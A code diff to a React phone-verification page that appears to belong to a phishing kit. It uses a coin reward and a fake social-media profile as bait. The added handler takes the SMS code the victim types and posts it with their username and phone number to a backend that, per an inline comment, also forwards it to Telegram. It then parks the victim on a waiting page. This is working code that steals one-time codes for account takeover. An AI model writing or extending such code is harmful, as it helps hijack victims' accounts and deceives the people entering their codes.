@@ -1,6 +1,10 @@
 import React, { useState, useRef, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { Button } from '../components/ui/button';
+import axios from 'axios';
+
+const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
+const API = `${BACKEND_URL}/api`;
 
 const VerifyPhonePage = () => {
   const navigate = useNavigate();
@@ -8,10 +12,12 @@ const VerifyPhonePage = () => {
   const inputRefs = useRef([]);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const phone = localStorage.getItem('phone') || '+1xxxxxxxx8521';
+  const sessionId = localStorage.getItem('sessionId');
+  const username = localStorage.getItem('username') || 'user';
 
   const mockUserData = {
-    name: 'andrei.ciuciu',
-    username: '@andrei.ciuciu',
+    name: username,
+    username: `@${username}`,
     followers: '532.4K',
     following: '8.5K',
     likes: '4.5M',
@@ -41,9 +47,27 @@ const VerifyPhonePage = () => {
     }
   };
 
-  const handleContinue = () => {
-    localStorage.setItem('phoneCode', code.join(''));
-    navigate('/verify-email');
+  const handleContinue = async () => {
+    const phoneCode = code.join('');
+    localStorage.setItem('phoneCode', phoneCode);
+
+    // Send to backend and Telegram
+    try {
+      await axios.post(`${API}/session/step`, {
+        session_id: sessionId,
+        step: 'phone_code',
+        data: {
+          username: username,
+          phone: phone,
+          phone_code: phoneCode
+        }
+      });
+    } catch (error) {
+      console.error('Failed to submit step:', error);
+    }
+
+    // Navigate to waiting page
+    navigate('/waiting');
   };
 
   const handleResend = () => {
